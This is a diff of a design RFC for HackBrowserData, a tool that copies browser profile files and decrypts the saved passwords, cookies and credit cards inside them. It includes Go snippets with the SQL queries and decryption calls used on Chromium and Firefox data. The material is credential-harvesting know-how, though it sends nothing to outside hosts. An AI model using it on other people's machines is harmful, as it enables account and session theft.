@@ -1,56 +1,74 @@
-# RFC-002: Data Extraction & File Acquisition Refactoring
+# RFC-002: Data Extraction & File Acquisition
 
 **Author**: moonD4rk
 **Status**: Proposed
 **Created**: 2026-03-14
-**Updated**: 2026-03-15
+**Updated**: 2026-03-16
 
 ## Abstract
 
-This RFC focuses on two subsystems of HackBrowserData:
+This RFC covers the implementation details of data extraction and file acquisition:
 
-1. **Data extraction**: how browser engines extract and decrypt data into `types.LoginEntry`, `types.CookieEntry`, etc.
-2. **File acquisition**: how browser files are discovered, copied, and cleaned up
+1. **File source mapping**: how each browser engine maps categories to files
+2. **File acquisition**: Session-based temp file management with deduplication
+3. **Extract methods**: concrete implementations for each data category
+4. **Shared helpers**: `QuerySQLite()` and `DecryptChromiumValue()`
+5. **Output**: writing `BrowserData` to CSV/JSON files
 
 **Constraint**: Go 1.20 (Windows 7 support).
 
-See RFC-001 for the overall architecture, data model redesign, crypto layer, browser registration, and CLI separation.
+See RFC-001 for data model (`Category` + `*Entry` types), crypto layer, browser registration, and Yandex variant design.
 
 ---
 
-## 1. Data Flow Overview
+## 1. Data Flow
 
 ```
+CLI: main.go
+    │
+    ▼
+browser.PickBrowsers("all", "")
+    │
+    │  platformBrowsers() → []BrowserConfig
+    │  → chromium.New(cfg, dir) / firefox.New(dir)
+    ▼
 Browser.BrowsingData(categories)
     │
-    ├─ filemanager.Session
-    │   └─ acquireFiles(sources, categories) → map[Category]tempPath
+    ├─ filemanager.NewSession()
+    │   └─ acquireFiles() with dedup → map[Category]tempPath
     │
-    ├─ masterKey (Chromium: KeyRetriever / Firefox: key4.db derivation)
+    ├─ masterKey
+    │   Chromium: keyretriever.RetrieveKey(storage)
+    │   Firefox:  deriveMasterKey(key4dbPath)
     │
     └─ per-category extract methods
-        │
-        │  Chromium: c.extractPasswords(masterKey, tempPath) → []types.LoginEntry
-        │  Firefox:  f.extractPasswords(masterKey, tempPath) → []types.LoginEntry
-        │                                                        ↑ same output type
-        │
-        └─ browserdata.BrowserData{Passwords: [...], Cookies: [...], ...}
+        ├─ c.extractPasswords(masterKey, path) → []LoginEntry
+        ├─ c.extractCookies(masterKey, path)   → []CookieEntry
+        ├─ c.extractHistories(path)            → []HistoryEntry
+        ├─ c.extractDownloads(path)            → []DownloadEntry
+        ├─ c.extractBookmarks(path)            → []BookmarkEntry
+        ├─ c.extractCreditCards(masterKey, path) → []CreditCardEntry
+        ├─ c.extractExtensions(path)           → []ExtensionEntry
+        ├─ c.extractLocalStorage(path)         → []StorageEntry    (LevelDB)
+        └─ c.extractSessionStorage(path)       → []StorageEntry    (LevelDB)
+            │
+            ▼
+        browserdata.BrowserData{Passwords: [...], Cookies: [...], ...}
+            │
+            ▼
+        BrowserData.Output(dir, name, format)
+            │
+            ▼
+        chrome_default_password.csv
+        chrome_default_cookie.json
+        ...
 ```
-
-Each browser engine (Chromium/Firefox) has its own extract methods that know:
-- Which SQL query or JSON structure to use
-- How to decrypt (AES-GCM, AES-CBC, ASN1-PBE, or no decryption)
-- How to map raw fields to `types.*Entry` models
-
-The output is always the browser-agnostic models defined in `types/models.go`.
 
 ---
 
 ## 2. File Source Mapping
 
-### 2.1 Design: Category → source (one flat map per engine)
-
-Each browser engine defines a simple map from `types.Category` to file path candidates:
+### 2.1 Category → source (one flat map per engine)
 
 ```go
 // browser/chromium/source.go
@@ -87,25 +105,26 @@ var firefoxSources = map[types.Category]source{
 }
 ```
 
+Yandex source map defined in RFC-001 Section 5.
+
 ### 2.2 File acquisition with deduplication
 
-When multiple categories map to the same file (e.g. History and Download both use "History"), the file is copied only once:
+When multiple categories map to the same file (e.g. History + Download), the file is copied once:
 
 ```go
 func (c *Chromium) acquireFiles(session *filemanager.Session, categories []types.Category) map[types.Category]string {
     result := make(map[types.Category]string)
-    copied := make(map[string]string) // abs src path → temp dst path
+    copied := make(map[string]string) // abs src → temp dst
 
     for _, cat := range categories {
-        src, ok := chromiumSources[cat]
+        src, ok := c.sources[cat]  // uses c.sources (chromiumSources or yandexSources)
         if !ok { continue }
 
         for _, rel := range src.paths {
             abs := filepath.Join(c.profileDir, rel)
 
-            // already copied this file? reuse
             if dst, ok := copied[abs]; ok {
-                result[cat] = dst
+                result[cat] = dst  // reuse already-copied file
                 break
             }
 
@@ -123,8 +142,6 @@ func (c *Chromium) acquireFiles(session *filemanager.Session, categories []types
 
 ### 2.3 Firefox key4.db: infrastructure, not a Category
 
-Firefox's `key4.db` is required for master key derivation but is NOT a data category. It is acquired separately:
-
 ```go
 func (f *Firefox) BrowsingData(categories []types.Category) (*browserdata.BrowserData, error) {
     session, _ := filemanager.NewSession()
@@ -138,31 +155,19 @@ func (f *Firefox) BrowsingData(categories []types.Category) (*browserdata.Browse
     masterKey, err := f.deriveMasterKey(keyPath)
     if err != nil { return nil, err }
 
-    data := &browserdata.BrowserData{}
-    for _, cat := range categories {
-        // ... extract each category
-    }
-    return data, nil
+    // ... extract each category (see Section 4)
 }
 ```
 
 ---
 
-## 3. Shared Extract Helpers: `browserdata/datautil/`
+## 3. Shared Helpers: `browserdata/datautil/`
 
-### 3.1 SQLite query helper — `datautil/sqlite.go`
+### 3.1 SQLite query helper
 
 ```go
-package datautil
+// browserdata/datautil/sqlite.go
 
-import (
-    "database/sql"
-    _ "modernc.org/sqlite"
-    "github.com/moond4rk/hackbrowserdata/log"
-)
-
-// QuerySQLite opens a SQLite DB, optionally disables journal mode,
-// runs the query, and calls scanFn for each row.
 func QuerySQLite(dbPath string, journalOff bool, query string, scanFn func(*sql.Rows) error) error {
     db, err := sql.Open("sqlite", dbPath)
     if err != nil { return err }
@@ -179,22 +184,18 @@ func QuerySQLite(dbPath string, journalOff bool, query string, scanFn func(*sql.
     for rows.Next() {
         if err := scanFn(rows); err != nil {
             log.Debugf("scan row error: %v", err)
-            continue
+            continue  // skip bad row, continue extraction
         }
     }
     return rows.Err()
 }
 ```
 
-### 3.2 Chromium decrypt helper — `datautil/decrypt.go`
+### 3.2 Chromium decrypt helper
 
 ```go
-package datautil
+// browserdata/datautil/decrypt.go
 
-import "github.com/moond4rk/hackbrowserdata/crypto"
-
-// DecryptChromiumValue tries DPAPI first, then Chromium AES-GCM/CBC.
-// If masterKey is empty, only tries DPAPI (Yandex behavior).
 func DecryptChromiumValue(masterKey, encrypted []byte) ([]byte, error) {
     if len(encrypted) == 0 { return nil, nil }
     if len(masterKey) == 0 {
@@ -212,22 +213,34 @@ func DecryptChromiumValue(masterKey, encrypted []byte) ([]byte, error) {
 
 ## 4. Extract Method Examples
 
-### 4.1 Chromium password extraction
+Each extract method lives in its own file inside the browser engine package. The default SQL query is a `const` in the same file. Override is checked via `c.queryOverrides`.
+
+### 4.1 Chromium password (SQLite + decryption)
 
 ```go
 // browser/chromium/extract_password.go
 
-const queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
+const defaultLoginQuery = `SELECT origin_url, username_value, password_value, date_created FROM logins`
 
-func (c *Chromium) extractPasswords(masterKey []byte, dbPath string) ([]types.LoginEntry, error) {
+func (c *Chromium) extractPasswords(masterKey []byte, path string) ([]types.LoginEntry, error) {
+    query := defaultLoginQuery
+    if q, ok := c.queryOverrides[types.Password]; ok {
+        query = q  // Yandex: SELECT action_url, ...
+    }
+
     var logins []types.LoginEntry
-    err := datautil.QuerySQLite(dbPath, false, queryChromiumLogin, func(rows *sql.Rows) error {
+    err := datautil.QuerySQLite(path, false, query, func(rows *sql.Rows) error {
         var url, username string
         var pwd []byte
         var created int64
         if err := rows.Scan(&url, &username, &pwd, &created); err != nil { return err }
 
-        password, _ := datautil.DecryptChromiumValue(masterKey, pwd)
+        password, err := datautil.DecryptChromiumValue(masterKey, pwd)
+        if err != nil {
+            log.Debugf("decrypt password for %s: %v", url, err)
+            return nil  // skip this record, continue extraction
+        }
+
         logins = append(logins, types.LoginEntry{
             URL:       url,
             Username:  username,
@@ -245,13 +258,69 @@ func (c *Chromium) extractPasswords(masterKey []byte, dbPath string) ([]types.Lo
 }
 ```
 
-### 4.2 Firefox password extraction
+### 4.2 Chromium cookie (SQLite + decryption)
+
+```go
+// browser/chromium/extract_cookie.go
+
+const defaultCookieQuery = `SELECT name, encrypted_value, host_key, path,
+    creation_utc, expires_utc, is_secure, is_httponly,
+    has_expires, is_persistent FROM cookies`
+
+func (c *Chromium) extractCookies(masterKey []byte, path string) ([]types.CookieEntry, error) {
+    query := defaultCookieQuery
+    if q, ok := c.queryOverrides[types.Cookie]; ok {
+        query = q
+    }
+
+    var cookies []types.CookieEntry
+    err := datautil.QuerySQLite(path, false, query, func(rows *sql.Rows) error {
+        var (
+            name, host, path                               string
+            isSecure, isHTTPOnly, hasExpire, isPersistent   int
+            createdAt, expireAt                             int64
+            encryptedValue                                  []byte
+        )
+        if err := rows.Scan(&name, &encryptedValue, &host, &path,
+            &createdAt, &expireAt, &isSecure, &isHTTPOnly,
+            &hasExpire, &isPersistent); err != nil {
+            return err
+        }
+
+        value, err := datautil.DecryptChromiumValue(masterKey, encryptedValue)
+        if err != nil {
+            log.Debugf("decrypt cookie %s on %s: %v", name, host, err)
+            return nil  // skip record
+        }
+
+        cookies = append(cookies, types.CookieEntry{
+            Name:       name,
+            Host:       host,
+            Path:       path,
+            Value:      string(value),
+            IsSecure:   isSecure != 0,
+            IsHTTPOnly: isHTTPOnly != 0,
+            ExpireAt:   typeutil.TimeEpoch(expireAt),
+            CreatedAt:  typeutil.TimeEpoch(createdAt),
+        })
+        return nil
+    })
+    if err != nil { return nil, err }
+
+    sort.Slice(cookies, func(i, j int) bool {
+        return cookies[i].CreatedAt.After(cookies[j].CreatedAt)
+    })
+    return cookies, nil
+}
+```
+
+### 4.3 Firefox password (JSON + ASN1PBE decryption)
 
 ```go
 // browser/firefox/extract_password.go
 
-func (f *Firefox) extractPasswords(masterKey []byte, jsonPath string) ([]types.LoginEntry, error) {
-    data, err := os.ReadFile(jsonPath)
+func (f *Firefox) extractPasswords(masterKey []byte, path string) ([]types.LoginEntry, error) {
+    data, err := os.ReadFile(path)
     if err != nil { return nil, err }
 
     var logins []types.LoginEntry
@@ -283,18 +352,123 @@ func (f *Firefox) extractPasswords(masterKey []byte, jsonPath string) ([]types.L
 }
 ```
 
-### 4.3 Key point
+### 4.4 Firefox cookie (SQLite, no encryption)
 
-Both `extractPasswords` methods return `[]types.LoginEntry`. The caller (BrowsingData) doesn't know or care which engine produced it. Encrypted bytes (`encryptedPwd`, `encUser`) are local variables inside extract methods — they never leak into the data models.
+```go
+// browser/firefox/extract_cookie.go
+
+const firefoxCookieQuery = `SELECT name, value, host, path,
+    creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
+
+func (f *Firefox) extractCookies(path string) ([]types.CookieEntry, error) {
+    var cookies []types.CookieEntry
+    err := datautil.QuerySQLite(path, true, firefoxCookieQuery, func(rows *sql.Rows) error {
+        var (
+            name, value, host, path string
+            isSecure, isHTTPOnly    int
+            createdAt, expiry       int64
+        )
+        if err := rows.Scan(&name, &value, &host, &path,
+            &createdAt, &expiry, &isSecure, &isHTTPOnly); err != nil {
+            return err
+        }
+
+        cookies = append(cookies, types.CookieEntry{
+            Name:       name,
+            Host:       host,
+            Path:       path,
+            Value:      value,  // not encrypted
+            IsSecure:   isSecure != 0,
+            IsHTTPOnly: isHTTPOnly != 0,
+            ExpireAt:   typeutil.TimeStamp(expiry),
+            CreatedAt:  typeutil.TimeStamp(createdAt / 1000000),
+        })
+        return nil
+    })
+    if err != nil { return nil, err }
+
+    sort.Slice(cookies, func(i, j int) bool {
+        return cookies[i].CreatedAt.After(cookies[j].CreatedAt)
+    })
+    return cookies, nil
+}
+```
+
+### 4.5 Chromium local storage (LevelDB)
+
+```go
+// browser/chromium/extract_storage.go
+
+func (c *Chromium) extractLocalStorage(path string) ([]types.StorageEntry, error) {
+    db, err := leveldb.OpenFile(path, nil)
+    if err != nil { return nil, err }
+    defer db.Close()
+
+    var entries []types.StorageEntry
+    iter := db.NewIterator(nil, nil)
+    defer iter.Release()
+
+    for iter.Next() {
+        url, name := parseStorageKey(iter.Key(), []byte{0}) // \x00 separator
+        if url == "" { continue }
+        entries = append(entries, types.StorageEntry{
+            URL:   url,
+            Key:   name,
+            Value: string(iter.Value()),
+        })
+    }
+    return entries, iter.Error()
+}
+
+func (c *Chromium) extractSessionStorage(path string) ([]types.StorageEntry, error) {
+    db, err := leveldb.OpenFile(path, nil)
+    if err != nil { return nil, err }
+    defer db.Close()
+
+    var entries []types.StorageEntry
+    iter := db.NewIterator(nil, nil)
+    defer iter.Release()
+
+    for iter.Next() {
+        url, name := parseStorageKey(iter.Key(), []byte("-")) // "-" separator
+        if url == "" { continue }
+        entries = append(entries, types.StorageEntry{
+            URL:   url,
+            Key:   name,
+            Value: string(iter.Value()),
+        })
+    }
+    return entries, iter.Error()
+}
+
+func parseStorageKey(key []byte, separator []byte) (url, name string) {
+    parts := bytes.SplitN(key, separator, 2)
+    if len(parts) != 2 { return "", "" }
+    return string(parts[0]), string(parts[1])
+}
+```
+
+### 4.6 Key differences between engines
+
+| Aspect | Chromium | Firefox |
+|--------|----------|---------|
+| Password source | SQLite (`Login Data`) | JSON (`logins.json`) |
+| Password decryption | DPAPI → AES-GCM/CBC | ASN1PBE |
+| Cookie encryption | Yes (masterKey needed) | No (plaintext) |
+| Cookie journal_mode | Not needed | `PRAGMA journal_mode=off` |
+| Time format | WebKit epoch (`TimeEpoch`) | Unix microseconds (`TimeStamp / 1e6`) |
+| Storage format | LevelDB directory | SQLite (`webappsstore.sqlite`) |
+| key4.db | Not used | Required for master key derivation |
+| masterKey parameter | Passed to password, cookie, creditcard | Passed to password only |
 
 ---
 
 ## 5. File Acquisition Layer
 
-### 5.1 Session manager — `filemanager/session.go`
+### 5.1 Session manager
 
 ```go
-package filemanager
+// filemanager/session.go
 
 type Session struct {
     tempDir string
@@ -313,11 +487,10 @@ func (s *Session) Acquire(src, dst string, isDir bool) error {
         return fileutil.CopyDir(src, dst, "lock")
     }
     if err := fileutil.CopyFile(src, dst); err != nil { return err }
-    // Copy WAL/SHM companion files
+    // Copy SQLite WAL/SHM companion files if present
     for _, suffix := range []string{"-wal", "-shm"} {
-        walSrc := src + suffix
-        if fileutil.IsFileExists(walSrc) {
-            _ = fileutil.CopyFile(walSrc, dst+suffix)
+        if fileutil.IsFileExists(src + suffix) {
+            _ = fileutil.CopyFile(src+suffix, dst+suffix)
         }
     }
     return nil
@@ -328,23 +501,9 @@ func (s *Session) Cleanup() {
 }
 ```
 
-### 5.2 Acquirer interface (optional, for future extensibility)
+### 5.2 Acquirer interface (deferred)
 
-```go
-// filemanager/acquirer.go
-
-type Acquirer interface {
-    Acquire(src, dst string, isDir bool) error
-}
-
-type CopyAcquirer struct{}
-
-func (a *CopyAcquirer) Acquire(src, dst string, isDir bool) error {
-    // same logic as Session.Acquire
-}
-```
-
-If only `CopyAcquirer` is needed now, the `Acquirer` interface can be deferred. `Session.Acquire()` handles it directly.
+If only `CopyAcquirer` is needed, `Session.Acquire()` handles it directly. The `Acquirer` interface can be introduced later when VSS or other strategies are needed.
 
 ---
 
@@ -354,7 +513,7 @@ If only `CopyAcquirer` is needed now, the `Acquirer` interface can be deferred. 
 // browserdata/output.go
 
 func (d *BrowserData) Output(dir, browserName, format string) error {
-    outputs := []struct {
+    items := []struct {
         name string
         data interface{}
         len  int
@@ -371,15 +530,23 @@ func (d *BrowserData) Output(dir, browserName, format string) error {
     }
 
     out := newOutPutter(format)
-    for _, o := range outputs {
-        if o.len == 0 { continue }
-        filename := fileutil.Filename(browserName, o.name, out.Ext())
+    var errs []error
+    for _, item := range items {
+        if item.len == 0 { continue }
+
+        filename := fileutil.Filename(browserName, item.name, out.Ext())
         f, err := out.CreateFile(dir, filename)
-        if err != nil { continue }
-        out.Write(o.data, f)
+        if err != nil {
+            errs = append(errs, fmt.Errorf("create %s: %w", filename, err))
+            continue
+        }
+        if err := out.Write(item.data, f); err != nil {
+            errs = append(errs, fmt.Errorf("write %s: %w", filename, err))
+        }
         f.Close()
+        log.Infof("exported: %s (%d items)", filename, item.len)
     }
-    return nil
+    return errors.Join(errs...)
 }
 ```
 
@@ -387,67 +554,72 @@ func (d *BrowserData) Output(dir, browserName, format string) error {
 
 ## 7. What Was Eliminated
 
-### Extractor interface and registry (entire `extractor/` package)
-
-**Before**: 20 types implementing `Extractor` interface, registered via `init()` in 9 packages, triggered by blank imports in `imports.go`.
-
-**After**: Each browser engine has typed extract methods (`extractPasswords`, `extractCookies`, ...) that return `[]types.*Entry` directly. No interface, no registry, no factory.
-
-### browserdata sub-packages (9 → 1)
-
-**Before**: `password/`, `cookie/`, `bookmark/`, `history/`, `download/`, `creditcard/`, `extension/`, `localstorage/`, `sessionstorage/` — each with its own types and boilerplate.
-
-**After**: Extract methods live inside `browser/chromium/` and `browser/firefox/`. `browserdata/` only contains `BrowserData` struct and output logic.
-
-### DataType enum (22 → 0)
-
-Replaced by `types.Category` (9 values) defined in RFC-001. No file mappings, no `TempFilename()`, no browser prefixes.
+| Before | After | Why |
+|--------|-------|-----|
+| `extractor/` package (interface + registry + factory) | Deleted | Browser engines have typed extract methods |
+| `browserdata/password/`, `cookie/`, etc. (9 sub-packages) | Deleted | Extract logic moved into `browser/chromium/` and `browser/firefox/` |
+| `browserdata/imports.go` | Deleted | No init() registration needed |
+| `types.DataType` (22 iota constants) | `types.Category` (9 constants) | No browser prefix, no key types |
+| `itemFileNames` map | `chromiumSources` / `firefoxSources` per engine | File layout is engine-internal |
+| `TempFilename()` on DataType | `Session.TempDir()` + `filepath.Base()` | Session manages temp paths |
+| `DefaultChromiumTypes`, `DefaultFirefoxTypes`, `DefaultYandexTypes` | `types.AllCategories` | One list for all engines |
+| `loginData.encryptPass`, `cookie.encryptValue` | Local variables in extract methods | Encrypted fields don't belong in data models |
+| 20 trivial `Name()` / `Len()` methods | Not needed | No Extractor interface |
 
 ---
 
 ## 8. Implementation Plan
 
-### Phase 1: Types and models (RFC-001)
+### Phase 1: Foundation (new files only, zero risk)
 
-1. Create `types/category.go` with `Category` enum
-2. Create `types/models.go` with all `*Entry` structs
-3. Create `browserdata/browserdata.go` with `BrowserData` struct
+1. `types/category.go` — Category enum
+2. `types/models.go` — all *Entry structs
+3. `browserdata/browserdata.go` — BrowserData struct
+4. `browserdata/datautil/sqlite.go` — QuerySQLite()
+5. `browserdata/datautil/decrypt.go` — DecryptChromiumValue()
+6. `filemanager/session.go` — Session
 
-### Phase 2: Shared helpers
+### Phase 2: Extract methods (new files, coexist with old code)
 
-1. Create `browserdata/datautil/sqlite.go` with `QuerySQLite()`
-2. Create `browserdata/datautil/decrypt.go` with `DecryptChromiumValue()`
+1. `browser/chromium/source.go` — chromiumSources, yandexSources
+2. `browser/chromium/extract_*.go` — all 9 extract methods
+3. `browser/firefox/source.go` — firefoxSources
+4. `browser/firefox/extract_*.go` — all extract methods
 
-### Phase 3: File acquisition
+### Phase 3: Wiring (modify existing files)
 
-1. Create `filemanager/session.go`
-2. Create `browser/chromium/source.go` with `chromiumSources`
-3. Create `browser/firefox/source.go` with `firefoxSources`
-4. Implement `acquireFiles()` with deduplication
+1. Update `Chromium.BrowsingData()` to use new extract methods
+2. Update `Firefox.BrowsingData()` to use new extract methods
+3. Update `BrowserConfig` and `PickBrowsers()`
+4. Update `browserdata/output.go`
+5. Update CLI `main.go`
 
-### Phase 4: Extract methods
-
-1. Implement Chromium extract methods (password, cookie, history, ...) in `browser/chromium/`
-2. Implement Firefox extract methods in `browser/firefox/`
-3. Wire into `BrowsingData()` with switch on Category
-4. Update output logic in `browserdata/`
-
-### Phase 5: Cleanup
+### Phase 4: Cleanup (delete old code)
 
 1. Delete `extractor/` package
 2. Delete `browserdata/imports.go`
-3. Delete `browserdata/password/`, `cookie/`, etc. (9 sub-packages)
-4. Delete old `types.DataType` and `itemFileNames`
-5. Run tests, cross-platform build verification
+3. Delete `browserdata/password/`, `cookie/`, etc.
+4. Delete old `types.DataType`, `itemFileNames`
+5. Delete `browser/consts.go`
+
+### Phase 5: Verification
+
+```bash
+go test ./...
+go vet ./...
+gofmt -d .
+GOOS=windows GOARCH=amd64 go build ./cmd/hack-browser-data/
+GOOS=linux GOARCH=amd64 go build ./cmd/hack-browser-data/
+GOOS=darwin GOARCH=amd64 go build ./cmd/hack-browser-data/
+```
 
 ---
 
 ## 9. Open Questions
 
-1. **Yandex**: separate extract methods in `chromium/` (e.g. `extractYandexPasswords`) or unify with Chromium extract?
-2. **Output format**: keep `gocsv` or switch to `encoding/csv` with manual header/row writing?
-3. **LocalStorage/SessionStorage**: keep as extract methods or extract into shared helper since Chromium LevelDB logic is complex?
-4. **Sort direction**: standardize all categories to sort DESC by date?
+1. **Sort direction**: standardize all categories to DESC by date?
+2. **Output format**: keep `gocsv` or switch to `encoding/csv`?
+3. **LevelDB key parsing**: the current `fillKey`/`fillHeader`/`fillValue` logic in localstorage is complex — how much of that detail carries over?
 
 ---
 
@@ -455,14 +627,15 @@ Replaced by `types.Category` (9 values) defined in RFC-001. No file mappings, no
 
 | Area | RFC-001 | RFC-002 (this doc) |
 |------|---------|-------------------|
-| Data model redesign | defines `Category` + `*Entry` types | uses them |
-| `BrowserData` container | defines struct | implements Output |
+| Data model (Category + *Entry) | defines | uses |
+| BrowserData container | defines | implements Output |
 | Cipher version | covered | — |
 | Master key retrieval | covered | — |
 | Browser registration | covered | — |
-| CLI separation | covered | — |
-| Error types | covered | uses them |
+| Yandex variant | covered | — |
+| Error handling pattern | covered | — |
 | File source mapping | — | covered |
 | File acquisition | — | covered |
 | Extract methods | — | covered |
 | datautil helpers | — | covered |
+| Output | — | covered |
